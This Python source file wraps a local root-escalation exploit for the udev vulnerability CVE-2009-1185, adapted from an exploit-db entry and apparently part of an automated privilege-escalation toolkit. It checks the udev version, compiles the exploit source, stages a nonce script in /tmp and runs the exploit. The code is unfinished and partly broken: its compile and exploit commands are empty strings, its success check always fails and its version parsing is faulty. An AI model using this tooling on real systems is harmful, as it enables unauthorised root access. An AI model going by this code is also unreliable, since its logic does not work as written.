"""
adapted from:
https://www.exploit-db.com/exploits/8572/
"""
import os
import uuid
import subprocess
from constants import LINUX_EXPLOIT_PATH, PLAYGROUND_PATH, HIGH_RELIABILITY

class CVE20091185:
	def __init__(self):
		self.source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE20091185.c")
		self.compilation_path = os.path.join(PLAYGROUND_PATH, "exploit")
		self.compilation_command = ""
		self.exploit_command = ""
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_kernels = {
			"confirmed": [],
			"potential": [
				"all"
			]
		}

	def determine_vulnerability(self):
		# popen for backwards compatibility to 2.7
		p = subprocess.Popen(
			["udevd", "--version"],
			stdin=subprocess.PIPE,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			shell=True
		)
		udev_v = p.communicate()[1].decode('utf-8').replace("\n","")

		if "not found" in udev_v:
			print("[-] not vulnerable: ({})".format(udev_v))
			return False
		elif int(udev_v) < 141:
			print("[*] udev version: {}".format(udev_v))
			print("[+] vulnerable to CVE20091185!")
			return True

	def confirm_exploitation(self):
		"""
		confirm_exploitation

		Checks for implementation specific details that confirm successful kernel exploitation
		:return: True or False
		"""
		return False 			# TODO: complete this vuln check


	def exploit(self):
		vuln = self.determine_vulnerability()
		if vuln:
			print("compiling: \'{}\'".format(" ".join(self.compilation_command)))
			return_code = subprocess.call(self.compilation_command)
			if return_code == 0 and os.path.exists(self.compilation_path): # TODO: complete command setup (find proc numb...etc)
				print("setting up /tmp/run for execution")
				root_nonce = uuid.uuid4().hex
				tmp_run = """
#!/bin/bash
echo {} > /tmp/nonce			
				""".format(root_nonce)
				print("exploiting")
				subprocess.call(self.exploit_command)
				if self.confirm_exploitation():
					print("[+] exploitation of CVE20091185 successful!")
				else:
					print("[-] exploitation of CVE20091185 failed")
		else:
			print("[-] not vulnerable to CVE20091185")
